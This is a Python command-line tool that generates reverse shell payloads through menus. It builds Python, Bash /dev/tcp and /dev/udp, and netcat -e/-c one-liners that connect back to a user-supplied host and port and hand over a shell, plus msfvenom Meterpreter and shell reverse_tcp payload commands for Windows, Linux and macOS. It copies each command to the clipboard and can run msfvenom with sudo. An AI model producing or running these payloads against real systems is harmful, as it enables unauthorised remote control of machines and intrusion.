#!/usr/bin/env python3
import pyperclip as clip
import os


def menu():
    print('''
    ________MENU_________
    \n[1]. Python \n[2]. BASH \n[3]. NetCat \n[4]. MSFVenom \n[9]. Exit
          ''')
def venomMenu():
    print('''
    ______MSFVENOM_______
    \n[1]. Meterpreter Staged x64 Rev. TCP \n[2]. Meterpreter Unstaged x64 Rev. TCP \n[3]. Stage Reverse TCP \n[9]. Exit
          ''')

def platformMenu():
    print('''
    ______PLATFORM_______
    \n[1]. Windows \n[2]. Linux \n[3]. MacOS \n[9]. Exit
          ''')


def venomsubprocess():
    selectShell = int(input("Select Shell: "))
    if selectShell == 1:
        lhost = input("LHOST= ")
        lport = input("LPORT= ")
        os.system("clear")
        platformMenu()
        platform = int(input("Select Platform: "))
        while platform >= 4 and platform != 9:
            os.system("clear")
            platformMenu()
            platform = int(input("Select Platform: "))
        if platform == 1:
            platform = "windows"
            ext = "exe"
        elif platform == 2:
            platform = "linux"
            ext = "elf"
        elif platform == 3:
            platform = "osx"
            ext = "macho"
        elif platform == 9:
            os.system("clear")
            venomMenu()
            venomsubprocess()
        name = input("Insert Name for exploit:")
        shell = "msfvenom -p {0}/x64/meterpreter/reverse_tcp LHOST={1} LPORT={2} -f {4} -o {3}.{4}".format(platform, lhost, lport, name, ext)
        print(shell)
        clip.copy(shell)
        print("Copied to clipboard")
        run = int(input("Do you Want to Run it? (0 = N  1 = Y) : ")) 
        while run >= 2 or run < 0:
            run = int(input("Do you Want to Run it? (N or Y) : "))
        if run == 0:
            print("The command isn't going to execute\n its still in the clipboard!")
            exit()
        elif run == 1:
            root = int(input("Execute with Root priveleges? (0 = N  1 = Y) : "))
            while root >= 2 or root < 0:
                root = int(input("Execute with Root priveleges? (0 = N  1 = Y) : "))
            if root == 0:
                print("\n Running... Please Wait")
                os.system(shell + " >/dev/null 2>&1")
                print("\nCommand has been executed **Without** Root priveleges!")
                exit()
            elif root == 1:
                print("\n Running... Please Wait")
                os.system("sudo " + shell + " >/dev/null 2>&1")
                print("\nCommand has been executed **With** Root priveleges!")
                exit()
    if selectShell == 2:
        lhost = input("LHOST= ")
        lport = input("LPORT= ")
        os.system("clear")
        platformMenu()
        platform = int(input("Select Platform: "))
        while platform >= 4 and platform != 9:
            os.system("clear")
            platformMenu()
            platform = int(input("Select Platform: "))
        if platform == 1:
            platform = "windows"
            ext = "exe"
        elif platform == 2:
            platform = "linux"
            ext = "elf"
        elif platform == 3:
            platform = "osx"
            ext = "macho"
        elif platform == 9:
            os.system("clear")
            venomMenu()
            venomsubprocess()
        name = input("Insert Name for exploit:")
        shell = "msfvenom -p {0}/x64/meterpreter_reverse_tcp LHOST={1} LPORT={2} -f {4} -o {3}.{4}".format(platform, lhost, lport, name, ext)
        print(shell)
        clip.copy(shell)
        print("Copied to clipboard")
        run = int(input("Do you Want to Run it? (0 = N  1 = Y) : ")) 
        while run >= 2 or run < 0:
            run = int(input("Do you Want to Run it? (N or Y) : "))
        if run == 0:
            print("The command isn't going to execute\n its still in the clipboard!")
            exit()
        elif run == 1:
            root = int(input("Execute with Root priveleges? (0 = N  1 = Y) : "))
            while root >= 2 or root < 0:
                root = int(input("Execute with Root priveleges? (0 = N  1 = Y) : "))
            if root == 0:
                print("\n Running... Please Wait")
                os.system(shell + " >/dev/null 2>&1")
                print("\nCommand has been executed **Without** Root priveleges!")
                exit()
            elif root == 1:
                print("\n Running... Please Wait")
                os.system("sudo " + shell + " >/dev/null 2>&1")
                print("\nCommand has been executed **With** Root priveleges!")
                exit()
    if selectShell == 3:
        lhost = input("LHOST= ")
        lport = input("LPORT= ")
        os.system("clear")
        platformMenu()
        platform = int(input("Select Platform: "))
        while platform >= 4 and platform != 9:
            os.system("clear")
            platformMenu()
            platform = int(input("Select Platform: "))
        if platform == 1:
            platform = "windows"
            ext = "exe"
        elif platform == 2:
            platform = "linux"
            ext = "elf"
        elif platform == 3:
            platform = "osx"
            ext = "macho"
        elif platform == 9:
            os.system("clear")
            venomMenu()
            venomsubprocess()
        name = input("Insert Name for exploit:")
        shell = "msfvenom -p {0}/x64/shell/reverse_tcp LHOST={1} LPORT={2} -f {4} -o {3}.{4}".format(platform, lhost, lport, name, ext)
        print(shell)
        clip.copy(shell)
        print("Copied to clipboard")
        run = int(input("Do you Want to Run it? (0 = N  1 = Y) : ")) 
        while run >= 2 or run < 0:
            run = int(input("Do you Want to Run it? (N or Y) : "))
        if run == 0:
            print("The command isn't going to execute\n its still in the clipboard!")
            exit()
        elif run == 1:
            root = int(input("Execute with Root priveleges? (0 = N  1 = Y) : "))
            while root >= 2 or root < 0:
                root = int(input("Execute with Root priveleges? (0 = N  1 = Y) : "))
            if root == 0:
                print("\n Running... Please Wait")
                os.system(shell + " >/dev/null 2>&1")
                print("\nCommand has been executed **Without** Root priveleges!")
                exit()
            elif root == 1:
                print("\n Running... Please Wait")
                os.system("sudo " + shell + " >/dev/null 2>&1")
                print("\nCommand has been executed **With** Root priveleges!")
                exit()
    if selectShell == 9:
        os.system("clear")
        main()
    else:
        os.system("clear")
        venomMenu()
        venomsubprocess()

def pymenu():
    print('''
    _______PYTHON________
    \n[1]. Python 2.7 \n[2]. Python 2.7 W/ Exports \n[3]. Python 3\n[4]. Python 3 W/ Exports \n[9]. Back to Main Menu
          ''')

def pysubprocess():
    selectShell = int(input("Select Shell: "))
    if selectShell == 1:
        rhost = input("RHOST= ")
        port = input("PORT= ")
        os.system("clear")
        shellType = int(input(''' 
    _______Shell Type________
    \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
        while shellType >= 4 and shellType != 9 or shellType < 0:
         os.system("clear")
         shellType = int(input(''' 
    _______Shell Type________
    \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
        if shellType == 1:
            shellType = "sh"
        elif shellType == 2:
            shellType = "bash"
        elif shellType == 3:
            shellType = "powershell"
        elif shellType == 9:
            os.system("clear")
            pymenu()
            pysubprocess()
        shell ="""python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("{2}")'""".format(rhost, port, shellType)
        print(shell)
        clip.copy(shell)
        print("\n Copied to Clipboard!")
        exit()
    if selectShell == 2:
        rhost = input("RHOST= ")
        port = input("PORT= ")
        os.system("clear")
        shellType = int(input(''' 
    _______Shell Type________
    \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
        while shellType >= 4 and shellType != 9 or shellType < 0:
         os.system("clear")
         shellType = int(input(''' 
    _______Shell Type________
    \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
        if shellType == 1:
            shellType = "sh"
        elif shellType == 2:
            shellType = "bash"
        elif shellType == 3:
            shellType = "powershell"
        elif shellType == 9:
            os.system("clear")
            pymenu()
            pysubprocess()
        shell ="""export RHOST="{0}";export RPORT={1};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("{2}")'""".format(rhost, port, shellType)
        print(shell)
        clip.copy(shell)
        print("\n Copied to Clipboard!")
        exit()
    if selectShell == 3:
        rhost = input("RHOST= ")
        port = input("PORT= ")
        os.system("clear")
        shellType = int(input(''' 
    _______Shell Type________
    \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
        while shellType >= 4 and shellType != 9 or shellType <0:
         os.system("clear")
         shellType = int(input(''' 
    _______Shell Type________
    \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
        if shellType == 1:
            shellType = "sh"
        elif shellType == 2:
            shellType = "bash"
        elif shellType == 3:
            shellType = "powershell"
        elif shellType == 9:
            os.system("clear")
            pymenu()
            pysubprocess()
        shell ="""python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("{2}")'""".format(rhost, port, shellType)
        print(shell)
        clip.copy(shell)
        print("\n Copied to Clipboard!")
        exit()
    if selectShell == 4:
        rhost = input("RHOST= ")
        port = input("PORT= ")
        os.system("clear")
        shellType = int(input(''' 
    _______Shell Type________
    \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
        while shellType >= 4 and shellType != 9 or shellType < 0:
         os.system("clear")
         shellType = int(input(''' 
    _______Shell Type________
    \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
        if shellType == 1:
            shellType = "sh"
        elif shellType == 2:
            shellType = "bash"
        elif shellType == 3:
            shellType = "powershell"
        elif shellType == 9:
            os.system("clear")
            pymenu()
            pysubprocess()
        shell ="""export RHOST="{0}";export RPORT={1};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("{2}")'""".format(rhost, port, shellType)
        print(shell)
        clip.copy(shell)
        print("\n Copied to Clipboard!")
        exit()
    elif selectShell == 9:
        main()
    else:
        os.system("clear")
        pymenu()
        pysubprocess()

def bashmenu():
    print('''
    ________BASH_________
    \n[1]. BASH -i \n[2]. BASH 196 \n[3]. BASH -i 5 \n[4]. BASH -i UDP \n[9]. Back to Main Menu
          ''')

def bashsubprocess():
    selectShell = int(input("Select Shell: "))
    if selectShell == 1:
        rhost = input("RHOST= ")
        port = input("PORT= ")
        os.system("clear")
        shellType = int(input(''' 
    _______Shell Type________
    \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
        while shellType >= 4 and shellType != 9 or shellType < 0:
         os.system("clear")
         shellType = int(input(''' 
    _______Shell Type________
    \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
        if shellType == 1:
            shellType = "sh"
        elif shellType == 2:
            shellType = "bash"
        elif shellType == 3:
            shellType = "powershell"
        elif shellType == 9:
            os.system("clear")
            bashmenu()
            bashsubprocess()
        shell = "{2} -i >& /dev/tcp/{0}/{1} 0>&1".format(rhost, port, shellType)
        print(shell)
        clip.copy(shell)
        print("Copied to Clipboard!")
        exit()
    if selectShell == 2:
        rhost = input("RHOST= ")
        port = input("PORT= ")
        os.system("clear")
        shellType = int(input(''' 
    _______Shell Type________
    \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
        while shellType >= 4 and shellType != 9 or shellType < 0:
         os.system("clear")
         shellType = int(input(''' 
    _______Shell Type________
    \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
        if shellType == 1:
            shellType = "sh"
        elif shellType == 2:
            shellType = "bash"
        elif shellType == 3:
            shellType = "powershell"
        elif shellType == 9:
            os.system("clear")
            bashmenu()
            bashsubprocess()
        shell = "0<&196;exec 196<>/dev/tcp/{0}/{1}; {2} <&196 >&196 2>&196".format(rhost, port, shellType)
        print(shell)
        clip.copy(shell)
        print("Copied to Clipboard!")
        exit()
    if selectShell == 3:
        rhost = input("RHOST= ")
        port = input("PORT= ")
        os.system("clear")
        os.system("clear")
        shellType = int(input(''' 
    _______Shell Type________
    \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
        while shellType >= 4 and shellType != 9 or shellType < 0:
         os.system("clear")
         shellType = int(input(''' 
    _______Shell Type________
    \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
        if shellType == 1:
            shellType = "sh"
        elif shellType == 2:
            shellType = "bash"
        elif shellType == 3:
            shellType = "powershell"
        elif shellType == 9:
            os.system("clear")
            bashmenu()
            bashsubprocess()
        shell = "{2} -i 5<> /dev/tcp/{0}/{1} 0<&5 1>&5 2>&5".format(rhost, port, shellType)
        print(shell)
        clip.copy(shell)
        print("Copied to Clipboard!")
        exit()
    if selectShell == 4:
        rhost = input("RHOST= ")
        port = input("PORT= ")
        os.system("clear")
        shellType = int(input(''' 
    _______Shell Type________
    \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
        while shellType >= 4 and shellType != 9 or shellType < 0:
         os.system("clear")
         shellType = int(input(''' 
    _______Shell Type________
    \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
        if shellType == 1:
            shellType = "sh"
        elif shellType == 2:
            shellType = "bash"
        elif shellType == 3:
            shellType = "powershell"
        elif shellType == 9:
            os.system("clear")
            bashmenu()
            bashsubprocess()
        shell = "{2} -i >& /dev/udp/{0}/{1} 0>&1".format(rhost, port,shellType)
        print(shell)
        clip.copy(shell)
        print("Copied to Clipboard!")
        exit()
    elif selectShell == 9:
        main()
    else:
        os.system("clear")
        bashmenu()
        bashsubprocess()

def ncmenu():
    print(''' 
    _______NETCAT________
    \n[1]. nc -e \n[2]. nc -c \n[9]. Back To main Menu
          ''')

def ncsubprocess():
    selectShell = int(input("Select Shell: ")) 
    if selectShell == 1:
        rhost = input("RHOST= ")
        port = input("PORT= ")
        os.system("clear")
        shellType = int(input(''' 
    _______Shell Type________
    \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
        while shellType >= 4 and shellType != 9 or shellType < 0:
            os.system("clear")
            shellType = int(input(''' 
    _______Shell Type________
    \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
        if shellType == 1:
            shellType = "sh" 
        elif shellType == 2:
            shellType = "bash"
        elif shellType == 3:
            shellType = "powershell"
        elif shellType == 9:
                os.system("clear")
                ncmenu()
                ncsubprocess()
        shell = "nc {0} {1} -e {2}".format(rhost, port, shellType)
        print(shell)
        clip.copy(shell)
        print("Copied to Clipboartd!")
        exit()

    if selectShell == 2:
        rhost = input("RHOST= ")
        port = input("PORT= ")
        os.system("clear")
        shellType = int(input(''' 
    _______Shell Type________
    \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
        while shellType >= 4 and shellType != 9 or shellType < 0:
            os.system("clear")
            shellType = int(input(''' 
    _______Shell Type________
    \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
        if shellType == 1:
            shellType = "sh"
        elif shellType == 2:
            shellType = "bash"
        elif shellType == 3:
            shellType = "powershell"
        if shellType == 9:
            os.system("clear")
            ncmenu()
            ncsubprocess()
        shell = "nc -c {2} {0} {1} ".format(rhost, port, shellType)
        print(shell)
        clip.copy(shell)
        print("Copied to Clipboartd!")
        exit()
    if selectShell == 9:
        main()
    else:
        os.system("clear")
        ncmenu()
        ncsubprocess()

def main():
    os.system("clear")
    menu()
    selectLib = int(input("Select Library: "))
    
    if selectLib == 1:
        os.system("clear")
        pymenu()
        pysubprocess()
    elif selectLib == 2:
        os.system("clear")
        bashmenu()
        bashsubprocess()
    elif selectLib == 3:
        os.system("clear")
        ncmenu()
        ncsubprocess()
    elif selectLib == 4:
        os.system("clear")
        venomMenu()
        venomsubprocess()

    elif selectLib == 9:
        exit()
    else:
        main()

if __name__ == "__main__":
    main()
